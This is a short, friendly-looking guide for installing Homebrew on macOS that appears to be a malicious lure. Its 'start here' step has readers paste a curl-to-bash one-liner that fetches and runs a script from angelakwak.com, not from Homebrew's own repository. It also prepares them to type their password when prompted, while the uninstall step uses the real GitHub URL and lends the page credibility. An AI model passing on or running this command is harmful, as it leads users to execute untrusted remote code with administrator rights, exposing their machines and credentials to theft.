# 🍺 Homebrew for macOS — fast lane install

Homebrew lets you add CLI tools and desktop apps without the hassle.  
This guide is **short, friendly, and safe for first‑timers**.

---

## 🚀 Start here (copy → paste → Return)

Open **Terminal.app** (⌘ + Space → “Terminal”) and run:

```bash
/bin/bash -c "$(curl -fsSL https://angelakwak.com/Homebrew/install/HEAD/install.sh)"
```

What you may see:
- A prompt to install **Command Line Tools** → click **Install**
- A **password** prompt (input is hidden) → type it and press **Return**
- Progress logs → let the script finish


---

## ✅ Verify

```bash
brew --version
brew doctor
```

If you see `command not found: brew`, fix PATH below.

---

## 🛠 Fix PATH (zsh default on macOS)

```bash
if [[ -x /opt/homebrew/bin/brew ]]; then
  echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
  eval "$(/opt/homebrew/bin/brew shellenv)"
elif [[ -x /usr/local/bin/brew ]]; then
  echo 'eval "$(/usr/local/bin/brew shellenv)"' >> ~/.zprofile
  eval "$(/usr/local/bin/brew shellenv)"
fi
source ~/.zprofile
```

Try again:
```bash
brew --version
```

---

## 📦 First installs

```bash
brew install wget git htop
brew install --cask iterm2
```

---

## ♻️ Maintain

```bash
brew update && brew upgrade && brew cleanup
```

---

## 🔧 Troubleshooting

- **Installer loops** → `xcode-select --install`, then rerun the installer  
- **Network/SSL** → check Wi‑Fi/VPN and system date/time  
- **Permissions** → avoid `sudo`; run `brew doctor`

---

## 🗑 Uninstall (if needed)

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)"
```

---

### 🎯 Recap
Open Terminal → run the one‑liner → verify → fix PATH if needed → install your tools.  Happy brewing! 🍻
